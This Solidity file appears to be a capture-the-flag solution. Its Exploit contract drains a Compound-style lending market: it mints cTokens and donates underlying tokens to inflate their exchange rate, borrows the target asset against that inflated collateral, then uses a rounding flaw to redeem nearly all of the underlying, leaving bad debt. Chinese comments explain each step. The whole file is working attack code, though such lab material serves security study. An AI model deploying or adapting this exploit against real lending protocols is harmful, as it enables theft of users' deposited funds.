// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/challenge/Challenge.sol";

contract Exploit {
    /* Code here */
    CErc20Immutable target;

    AppworksToken targetUnderlying;

    AppworksToken CWETH;

    CErc20Immutable CCWETH;

    Comptroller comptroller;

    Challenge chall;

    uint256 borrowAmount;

    constructor(address _target, address _targetUnderlyng, address _chall, uint256 _borrowAmount) {
        target = CErc20Immutable(_target);

        targetUnderlying = AppworksToken(_targetUnderlyng);

        chall = Challenge(_chall);

        CWETH = chall.CWETH();

        CCWETH = chall.CCWETH();

        comptroller = chall.comptroller();

        borrowAmount = _borrowAmount;
    }

    function drain() external {
        // 先 mint 兩顆 cToken 並 enterMarkets 當作抵押品
        CWETH.approve(address(CCWETH), type(uint256).max);

        CCWETH.mint(2);
        console2.log("CCWETH balance: ", CCWETH.balanceOf(address(this)));
        console2.log("CWETH balance: ", CWETH.balanceOf(address(this)));

        address[] memory cToken = new address[](1);

        cToken[0] = address(CCWETH);

        comptroller.enterMarkets(cToken);

        // 原本的 CToken 只有 2 顆，交換率 1:1、價格 200、抵押因子 0.7 的情況下，只能借 280 USD 的東西
        (, uint256 liquidity0,) = comptroller.getAccountLiquidity(address(this));
        console2.log("liquidity: ", liquidity0);

        //  把剩下的 underlying 轉到 CToken 的 Pool 裡面，讓 CToken 兌換率提高 (1/1 => 1e22/2)，價值跟著提高，可以借 2 * 5e21 * 200 * 0.7 = 1.4e24 USD 的東西
        CWETH.transfer(address(CCWETH), CWETH.balanceOf(address(this)));

        (, uint256 liquidity1,) = comptroller.getAccountLiquidity(address(this));
        console2.log("liquidity: ", liquidity1);

        // CToken 的價值提高後，用來借 target underlying 出來
        target.borrow(borrowAmount);

        // 把大部分的 underlying 拿回來，因為除法無條件捨去的關係，雖然算出來 1.9x wei 但實際上只會燒掉 1 wei 的 CToken，所以還可以留下一顆 CCWETH，交換率也回到 1/1，抵押品價值大幅下降，此時 shorfall > 0，可以被清算
        CCWETH.redeemUnderlying(1e22 - 1);
        (,, uint256 shortfall) = comptroller.getAccountLiquidity(address(this));
        console2.log("shortfall: ", shortfall);

        // 借到的錢跟一開始的 CWETH 都轉回去給 msg.sender
        targetUnderlying.transfer(msg.sender, targetUnderlying.balanceOf(address(this)));
        CWETH.transfer(msg.sender, CWETH.balanceOf(address(this)));
    }
}
